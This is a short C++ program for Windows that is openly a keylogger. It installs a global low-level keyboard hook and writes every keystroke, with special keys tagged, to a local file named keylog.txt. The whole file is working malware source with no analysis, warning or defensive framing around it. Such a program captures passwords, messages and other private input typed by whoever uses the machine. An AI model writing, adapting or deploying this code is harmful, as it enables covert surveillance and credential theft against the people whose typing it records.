#include <iostream>
#include <fstream>
#include <Windows.h>
#include <ctime>


LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD keyCode = kbStruct->vkCode;

        // Open file for appending
        std::ofstream logFile("keylog.txt", std::ios::app);

        if (logFile.is_open()) {
            // Convert virtual key code to character if possible
            char key = MapVirtualKey(keyCode, MAPVK_VK_TO_CHAR);

            // Handle special keys and printable characters
            switch (keyCode) {
            case VK_RETURN:
                logFile << "[ENTER]";
                break;
            case VK_SPACE:
                logFile << "[SPACE]";
                break;
            case VK_BACK:
                logFile << "[BACKSPACE]";
                break;
            case VK_TAB:
                logFile << "[TAB]";
                break;
            case VK_SHIFT:
                logFile << "[SHIFT]";
                break;
            case VK_CONTROL:
                logFile << "[CTRL]";
                break;
            case VK_MENU:
                logFile << "[ALT]";
                break;
            case VK_CAPITAL:
                logFile << "[CAPS LOCK]";
                break;
            case VK_ESCAPE:
                logFile << "[ESC]";
                break;
            default:
                if (isprint(key))
                    logFile << key;
                else
                    logFile << "[" << keyCode << "]";
                break;
            }

            logFile << std::endl;
            logFile.close();
        }
    }

    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    // Clear or create the log file
    std::ofstream logFile("keylog.txt");
    

    // Set up the keyboard hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);

    if (keyboardHook == NULL) {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    // Message loop to keep the program running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and cleanup
    UnhookWindowsHookEx(keyboardHook);

    return 0;
}